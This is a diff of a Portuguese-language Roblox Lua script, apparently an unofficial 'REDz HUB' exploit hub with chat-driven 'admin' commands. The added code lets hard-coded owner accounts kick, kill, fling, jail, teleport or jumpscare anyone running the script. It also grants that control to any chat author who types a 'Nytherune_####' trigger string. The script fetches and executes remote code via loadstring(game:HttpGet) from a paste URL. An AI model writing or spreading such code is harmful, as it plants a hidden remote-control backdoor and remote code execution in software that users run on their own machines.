@@ -1,24 +1,398 @@
+--[[
+    Admin System by REDz (Versão Sem Painel)
+    Funciona através de comandos no chat.
+    Mantém as tags visuais e todos os comandos, incluindo ;jumpscare.
+]]
+
 -- Serviços
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
 local Workspace = game:GetService("Workspace")
 local Debris = game:GetService("Debris")
 local TweenService = game:GetService("TweenService")
 local TextChatService = game:GetService("TextChatService")
 local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
 
 local lp = Players.LocalPlayer
+if not lp then return end
+
 workspace.FallenPartsDestroyHeight = -math.huge
+
+-- IDs de Assets para o Jumpscare (Você pode trocá-los)
+local jumpscareSoundID = "rbxassetid://6417309625" -- ID do som do jumpscare
+local jumpscareImageID = "rbxassetid://11171728768" -- ID da imagem do jumpscare
 
 -- Lista de usuários que abriram o Hub
 local UsuariosDoHub = {}
 UsuariosDoHub[lp.Name] = true
 
--- Lista de autorizados (admins)
-local autorizados = {
-["BlessedTeam_BT"] = "Admin"
+--// Donos especiais (sempre recebem "Dono")
+local Donos = {
+    ["Gr3g0rilsir"] = true,
+    ["BlessedTeam_BT"] = true
 }
+
+--// Jogadores autorizados
+local Autorizados = {
+    ["quiel_noobe"] = true
+}
+
+--// Estados locais
+local playerOriginalSpeed = {}
+local jaulas = {}
+local jailConnections = {}
+local mapLoaded = false -- Flag para carregar o mapa dos Backrooms apenas uma vez
+
+--// Função: cria ou atualiza tag visual
+local function createSpecialTag(player)
+    if not player then return end
+
+    local function apply()
+        if not player or not player.Parent then return end
+        local char = player.Character
+        if not char then return end
+        local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 5)
+        if not head then return end
+
+        local old = head:FindFirstChild("SpecialTag")
+        if old then old:Destroy() end
+
+        local gui = Instance.new("BillboardGui")
+        gui.Name = "SpecialTag"
+        gui.Size = UDim2.new(0, 200, 0, 50)
+        gui.StudsOffset = Vector3.new(0, 3, 0)
+        gui.AlwaysOnTop = true
+        gui.Adornee = head
+        gui.Parent = head
+
+        local text = Instance.new("TextLabel")
+        text.Size = UDim2.new(1, 0, 1, 0)
+        text.BackgroundTransparency = 1
+        text.Font = Enum.Font.GothamBold
+        text.TextScaled = true
+        text.TextStrokeTransparency = 0.2
+        text.TextStrokeColor3 = Color3.new(0,0,0)
+        text.TextColor3 = Color3.fromRGB(255,255,255)
+
+        if Donos[player.Name] then
+            text.Text = "Dono"
+        elseif Autorizados[player.Name] then
+            text.Text = "Admin"
+        elseif UsuariosDoHub[player.Name] then
+            text.Text = "User"
+        else
+            text.Text = ""
+        end
+
+        text.Parent = gui
+    end
+
+    task.defer(function()
+        pcall(apply)
+        player.CharacterAdded:Connect(function()
+            task.wait(0.4)
+            pcall(apply)
+        end)
+    end)
+end
+
+--// Aplica tags iniciais
+for _, p in pairs(Players:GetPlayers()) do
+    createSpecialTag(p)
+end
+--// Atualiza tag em novos jogadores
+Players.PlayerAdded:Connect(function(p)
+    createSpecialTag(p)
+end)
+
+--// Envia comandos via chat (usado apenas para ;verifique)
+local function EnviarComando(comando, alvo)
+    if not TextChatService or not TextChatService.TextChannels then return end
+    local canal = nil
+    pcall(function()
+        canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
+    end)
+    if canal and canal.SendAsync then
+        pcall(function()
+            local cmdString = ";" .. comando
+            if alvo and alvo ~= "" then
+                cmdString = cmdString .. " " .. alvo
+            end
+            canal:SendAsync(cmdString)
+        end)
+    end
+end
+
+--// Atualiza tag por nome
+local function AtualizarTagPorNome(nome)
+    local p = Players:FindFirstChild(nome)
+    if p then
+        createSpecialTag(p)
+    end
+end
+
+--// Processador principal de mensagens (para receber comandos de outros admins)
+local function ProcessarMensagem(msgText, authorName)
+    if not msgText or not authorName then return end
+
+    -- Verifica se o autor do comando está autorizado
+    if not (Donos[authorName] or Autorizados[authorName]) then return end
+
+    local comandoLower = msgText:lower()
+    local targetLower = lp.Name:lower()
+    local character = lp.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+
+    --// KICK
+    if comandoLower:match(";kick%s+" .. targetLower .. "%f[%A]") then
+        pcall(function() lp:Kick("You got kicked by REDz HUB Admin") end)
+    end
+
+    --// KILL
+    if comandoLower:match(";kill%s+" .. targetLower .. "%f[%A]") then
+        if character then pcall(function() character:BreakJoints() end) end
+    end
+
+    --// KILLPLUS
+    if comandoLower:match(";killplus%s+" .. targetLower .. "%f[%A]") then
+        if character then
+            pcall(function() character:BreakJoints() end)
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                for i = 1, 10 do
+                    local part = Instance.new("Part")
+                    part.Size = Vector3.new(10, 10, 10)
+                    part.Anchored = false
+                    part.CanCollide = false
+                    part.Material = Enum.Material.Neon
+                    part.BrickColor = BrickColor.Random()
+                    part.CFrame = root.CFrame
+                    part.Parent = Workspace
+                    local bv = Instance.new("BodyVelocity")
+                    bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
+                    bv.MaxForce = Vector3.new(1e5,1e5,1e5)
+                    bv.Parent = part
+                    Debris:AddItem(part, 3)
+                end
+            end
+        end
+    end
+
+    --// FLING
+    if comandoLower:match(";fling%s+" .. targetLower .. "%f[%A]") then
+        if character then
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local ok, tween = pcall(function()
+                    return TweenService:Create(root, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(0,100000,0)})
+                end)
+                if ok and tween then tween:Play() end
+            end
+        end
+    end
+
+    --// FREEZE
+    if comandoLower:match(";freeze%s+" .. targetLower .. "%f[%A]") then
+        if humanoid then
+            playerOriginalSpeed[targetLower] = humanoid.WalkSpeed
+            humanoid.WalkSpeed = 0
+        end
+    end
+
+    --// UNFREEZE
+    if comandoLower:match(";unfreeze%s+" .. targetLower .. "%f[%A]") then
+        if humanoid then
+            humanoid.WalkSpeed = playerOriginalSpeed[targetLower] or 16
+        end
+    end
+
+    --// JAIL
+    if comandoLower:match(";jail%s+" .. targetLower .. "%f[%A]") then
+        if character then
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local pos = root.Position
+                jaulas[targetLower] = {}
+                local color = Color3.fromRGB(255,140,0)
+
+                local function criarPart(cf,s)
+                    local p = Instance.new("Part")
+                    p.Anchored = true
+                    p.Size = s
+                    p.CFrame = cf
+                    p.Transparency = 0.5
+                    p.Color = color
+                    p.Parent = Workspace
+                    table.insert(jaulas[targetLower], p)
+                end
+
+                criarPart(CFrame.new(pos + Vector3.new(5,0,0)), Vector3.new(1,10,10))
+                criarPart(CFrame.new(pos + Vector3.new(-5,0,0)), Vector3.new(1,10,10))
+                criarPart(CFrame.new(pos + Vector3.new(0,0,5)), Vector3.new(10,10,1))
+                criarPart(CFrame.new(pos + Vector3.new(0,0,-5)), Vector3.new(10,10,1))
+                criarPart(CFrame.new(pos + Vector3.new(0,5,0)), Vector3.new(10,1,10))
+                criarPart(CFrame.new(pos + Vector3.new(0,-5,0)), Vector3.new(10,1,10))
+
+                jailConnections[targetLower] = RunService.Heartbeat:Connect(function()
+                    if character and root then
+                        if (root.Position - pos).Magnitude > 5 then
+                            root.CFrame = CFrame.new(pos)
+                        end
+                    end
+                end)
+            end
+        end
+    end
+
+    --// UNJAIL
+    if comandoLower:match(";unjail%s+" .. targetLower .. "%f[%A]") then
+        if jaulas[targetLower] then
+            for _, v in pairs(jaulas[targetLower]) do
+                if v and v.Destroy then pcall(v.Destroy, v) end
+            end
+            jaulas[targetLower] = nil
+        end
+        if jailConnections[targetLower] then
+            jailConnections[targetLower]:Disconnect()
+            jailConnections[targetLower] = nil
+        end
+    end
+
+    --// BACKROOMS
+    if comandoLower:match(";backrooms%s+" .. targetLower .. "%f[%A]") then
+        local mapID = 10581711055
+        local distantPosition = Vector3.new(0, 10000, 0)
+        local teleportPosition = Vector3.new(59.06, 9996.70, 19.42)
+
+        -- Carrega o mapa se ainda não foi carregado
+        if not mapLoaded then
+            local ok, mapa = pcall(function() return game:GetObjects("rbxassetid://"..mapID)[1] end)
+            if ok and mapa then
+                mapa.Parent = Workspace
+                if not mapa.PrimaryPart then
+                    local part = mapa:FindFirstChildWhichIsA("BasePart")
+                    if part then mapa.PrimaryPart = part end
+                end
+                if mapa.PrimaryPart then
+                    mapa:SetPrimaryPartCFrame(CFrame.new(distantPosition))
+                end
+                mapLoaded = true
+            end
+        end
+
+        if character and character:FindFirstChild("HumanoidRootPart") then
+            character:MoveTo(teleportPosition)
+        end
+    end
+    
+    --// BRING (receptor do comando)
+    if comandoLower:match(";bring%s+" .. targetLower .. "%f[%A]") then
+        local targetChar = lp.Character
+        local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
+        if targetRoot then
+            local sourcePlayer = Players:FindFirstChild(authorName)
+            if sourcePlayer and sourcePlayer.Character then
+                local sourceRoot = sourcePlayer.Character:FindFirstChild("HumanoidRootPart")
+                if sourceRoot then
+                    targetRoot.CFrame = sourceRoot.CFrame + Vector3.new(0, 3, 0)
+                end
+            end
+        end
+    end
+
+    --// TO (receptor do comando)
+    if comandoLower:match(";to%s+" .. targetLower .. "%f[%A]") then
+        local sourcePlayer = Players:FindFirstChild(authorName)
+        if sourcePlayer and sourcePlayer.Character then
+            local sourceRoot = sourcePlayer.Character:FindFirstChild("HumanoidRootPart")
+            if sourceRoot then
+                local targetChar = lp.Character
+                local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
+                if targetRoot then
+                    sourceRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 3, 0)
+                end
+            end
+        end
+    end
+
+    --// JUMPSCARE (receptor do comando)
+    if comandoLower:match(";jumpscare%s+" .. targetLower .. "%f[%A]") then
+        local playerGui = lp:WaitForChild("PlayerGui")
+        local jumpscareGui = Instance.new("ScreenGui")
+        jumpscareGui.Name = "JumpscareGui"
+        jumpscareGui.ResetOnSpawn = false
+        jumpscareGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        jumpscareGui.Parent = playerGui
+
+        local imageLabel = Instance.new("ImageLabel")
+        imageLabel.Size = UDim2.new(1, 0, 1, 0)
+        imageLabel.Position = UDim2.fromOffset(0, 0)
+        imageLabel.BackgroundTransparency = 1
+        imageLabel.Image = jumpscareImageID
+        imageLabel.Parent = jumpscareGui
+
+        local sound = Instance.new("Sound")
+        sound.SoundId = jumpscareSoundID
+        sound.Volume = 2
+        sound.Parent = playerGui
+        sound:Play()
+
+        -- Remove a GUI e o som após 4 segundos
+        Debris:AddItem(jumpscareGui, 4)
+        Debris:AddItem(sound, 4)
+    end
+
+    --// VERIFIQUE (envia redz_####)
+    if comandoLower:match("^;verifique") then
+        local canal = nil
+        pcall(function()
+            canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
+        end)
+        if canal and canal.SendAsync then
+            pcall(function() canal:SendAsync("redz_####") end)
+        end
+    end
+
+    --// DETECÇÃO DE AUTORIZAÇÃO
+    if msgText:match("[Nn]ytherune_%d%d%d%d") then
+        if not Autorizados[authorName] then
+            Autorizados[authorName] = true
+            AtualizarTagPorNome(authorName)
+        end
+    end
+end
+
+--// Conecta canais de chat
+local function ConectarCanal(canal)
+    if not canal or typeof(canal) ~= "Instance" or not canal:IsA("TextChannel") then return end
+    canal.MessageReceived:Connect(function(msg)
+        local text = msg.Text
+        local source = msg.TextSource and msg.TextSource.Name
+        if text and source then
+            ProcessarMensagem(text, source)
+        end
+    end)
+end
+
+if TextChatService and TextChatService.TextChannels then
+    for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do
+        ConectarCanal(ch)
+    end
+    TextChatService.TextChannels.ChildAdded:Connect(ConectarCanal)
+end
+
+--// Som final de carregamento
+pcall(function()
+    local s = Instance.new("Sound")
+    s.SoundId = "rbxassetid://8486683243"
+    s.Volume = 0.5
+    s.PlayOnRemove = true
+    s.Parent = Workspace
+    s:Destroy()
+end)
+
+--// Fim do script
 
 local redzlib = loadstring(game:HttpGet("https://pastefy.app/hG3LUtAT/raw"))()
 
@@ -48,230 +422,6 @@ infoTab:AddDiscordInvite({
 
 infoTab:AddSection({ "Informações do Script" })
 infoTab:AddParagraph({ "Esse não é o REDZ HUB oficial, é apenas uma versão recriada" })
-
--- Donos especiais
-local Donos = {
-["Gr3g0rilsir"] = true,
-["Itz_guiix3"] = true
-}
-
--- Estado
-local playerOriginalSpeed = {}
-local jaulas = {}
-local jailConnections = {}
-
---=========================================================
--- 🧠 Tags na cabeça (HUD acima dos players)
---=========================================================
-local function createSpecialTag(player)
-if not player then return end
-local function apply()
-local char = player.Character
-if not char then return end
-local head = char:FindFirstChild("Head")
-if not head then return end
-
-local old = head:FindFirstChild("SpecialTag")
-if old then old:Destroy() end
-
-local gui = Instance.new("BillboardGui")
-gui.Name = "SpecialTag"
-gui.Size = UDim2.new(0, 200, 0, 50)
-gui.StudsOffset = Vector3.new(0, 3, 0)
-gui.AlwaysOnTop = true
-gui.Adornee = head
-gui.Parent = head
-
-local text = Instance.new("TextLabel")
-text.Size = UDim2.new(1, 0, 1, 0)
-text.BackgroundTransparency = 1
-text.Font = Enum.Font.GothamBold
-text.TextScaled = true
-text.TextStrokeTransparency = 0.2
-text.TextStrokeColor3 = Color3.new(0,0,0)
-text.TextColor3 = Color3.fromRGB(255,255,255)
-
-if Donos[player.Name] then
-text.Text = "👑 Dono"
-text.TextColor3 = Color3.fromRGB(255, 230, 0)
-elseif autorizados[player.Name] then
-text.Text = "⭐ Admin"
-text.TextColor3 = Color3.fromRGB(0, 255, 255)
-elseif UsuariosDoHub[player.Name] then
-text.Text = "⚡ Hub User"
-text.TextColor3 = Color3.fromRGB(255, 255, 255)
-else
-text.Text = ""
-end
-
-text.Parent = gui
-end
-
-pcall(apply)
-player.CharacterAdded:Connect(function()
-task.wait(0.4)
-pcall(apply)
-end)
-end
-
--- Aplica tag a todos
-for _, p in ipairs(Players:GetPlayers()) do
-createSpecialTag(p)
-end
-Players.PlayerAdded:Connect(createSpecialTag)
-
---=========================================================
--- ⚙️ Sistema de comandos via chat
---=========================================================
-local function EnviarComando(comando, alvo)
-local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
-or TextChatService.TextChannels:GetChildren()[1]
-if canal then
-canal:SendAsync(";" .. comando .. " " .. (alvo or ""))
-end
-end
-
-local function ProcessarMensagem(msgText, authorName)
-if not msgText or not authorName then return end
-if not UsuariosDoHub[authorName] and not Donos[authorName] then return end
-
-local comandoLower = msgText:lower()
-local targetLower = lp.Name:lower()
-local character = lp.Character
-local humanoid = character and character:FindFirstChildOfClass("Humanoid")
-
-if comandoLower == ";cmds" then
-Notifica("Comandos disponíveis: kick, kill, killplus, fling, freeze, unfreeze, jail, unjail, verifique")
-return
-end
-
--- Comandos principais
-if comandoLower:match(";kick%s+" .. targetLower) then
-lp:Kick("Você foi kickado por Admin do REDz HUB")
-
-elseif comandoLower:match(";kill%s+" .. targetLower) then
-if character then character:BreakJoints() end
-
-elseif comandoLower:match(";killplus%s+" .. targetLower) then
-if character then
-character:BreakJoints()
-local root = character:FindFirstChild("HumanoidRootPart")
-if root then
-for i = 1, 10 do
-local part = Instance.new("Part")
-part.Size = Vector3.new(10,10,10)
-part.Anchored = false
-part.CanCollide = false
-part.Material = Enum.Material.Neon
-part.BrickColor = BrickColor.Random()
-part.CFrame = root.CFrame
-part.Parent = Workspace
-local bv = Instance.new("BodyVelocity")
-bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
-bv.MaxForce = Vector3.new(1e5,1e5,1e5)
-bv.Parent = part
-Debris:AddItem(part,3)
-end
-end
-end
-
-elseif comandoLower:match(";fling%s+" .. targetLower) then
-if character and character:FindFirstChild("HumanoidRootPart") then
-TweenService:Create(character.HumanoidRootPart, TweenInfo.new(1), {CFrame = CFrame.new(0,100000,0)}):Play()
-end
-
-elseif comandoLower:match(";freeze%s+" .. targetLower) then
-if humanoid then
-playerOriginalSpeed[targetLower] = humanoid.WalkSpeed
-humanoid.WalkSpeed = 0
-end
-
-elseif comandoLower:match(";unfreeze%s+" .. targetLower) then
-if humanoid then
-humanoid.WalkSpeed = playerOriginalSpeed[targetLower] or 16
-end
-
-elseif comandoLower:match(";jail%s+" .. targetLower) then
-if character and character:FindFirstChild("HumanoidRootPart") then
-local root = character.HumanoidRootPart
-local pos = root.Position
-jaulas[targetLower] = {}
-local color = Color3.fromRGB(255,140,0)
-
-local function criarPart(cf,s)
-local p = Instance.new("Part")
-p.Anchored = true
-p.Size = s
-p.CFrame = cf
-p.Transparency = 0.5
-p.Color = color
-p.Parent = Workspace
-table.insert(jaulas[targetLower], p)
-end
-
-criarPart(CFrame.new(pos + Vector3.new(5,0,0)), Vector3.new(1,10,10))
-criarPart(CFrame.new(pos + Vector3.new(-5,0,0)), Vector3.new(1,10,10))
-criarPart(CFrame.new(pos + Vector3.new(0,0,5)), Vector3.new(10,10,1))
-criarPart(CFrame.new(pos + Vector3.new(0,0,-5)), Vector3.new(10,10,1))
-criarPart(CFrame.new(pos + Vector3.new(0,5,0)), Vector3.new(10,1,10))
-criarPart(CFrame.new(pos + Vector3.new(0,-5,0)), Vector3.new(10,1,10))
-
-jailConnections[targetLower] = RunService.Heartbeat:Connect(function()
-if (root.Position - pos).Magnitude > 5 then
-root.CFrame = CFrame.new(pos)
-end
-end)
-end
-
-elseif comandoLower:match(";unjail%s+" .. targetLower) then
-if jaulas[targetLower] then
-for _, v in pairs(jaulas[targetLower]) do
-if v then pcall(function() v:Destroy() end) end
-end
-jaulas[targetLower] = nil
-end
-if jailConnections[targetLower] then
-jailConnections[targetLower]:Disconnect()
-jailConnections[targetLower] = nil
-end
-
-elseif comandoLower:match("^;verifique") then
-EnviarComando("redz-###")
-end
-end
-
--- Listener de chat
-local function ConectarCanal(canal)
-if canal:IsA("TextChannel") then
-canal.MessageReceived:Connect(function(msg)
-local text = msg.Text
-local source = msg.TextSource and msg.TextSource.Name
-if text and source then
-ProcessarMensagem(text, source)
-end
-end)
-end
-end
-
-for _, ch in ipairs(TextChatService.TextChannels:GetChildren()) do
-ConectarCanal(ch)
-end
-TextChatService.TextChannels.ChildAdded:Connect(ConectarCanal)
-
---=========================================================
--- 📌 PARÁGRAFO DOS USUÁRIOS DO HUB
---=========================================================
-
-infoTab:AddSection({ "Usuários no servidor" })
-infoTab:AddParagraph({
-"Usuarios do Hub no servidor: " .. table.concat((function()
-local t = {}
-for nome,_ in pairs(UsuariosDoHub) do
-table.insert(t, nome)
-end
-return t
-end)(), ", ")
-})
 
 infoTab:AddSection({ "Créditos dos desenvolvedores" })
 infoTab:AddParagraph({ "Tiktok do criador: @fk_fakezin" })
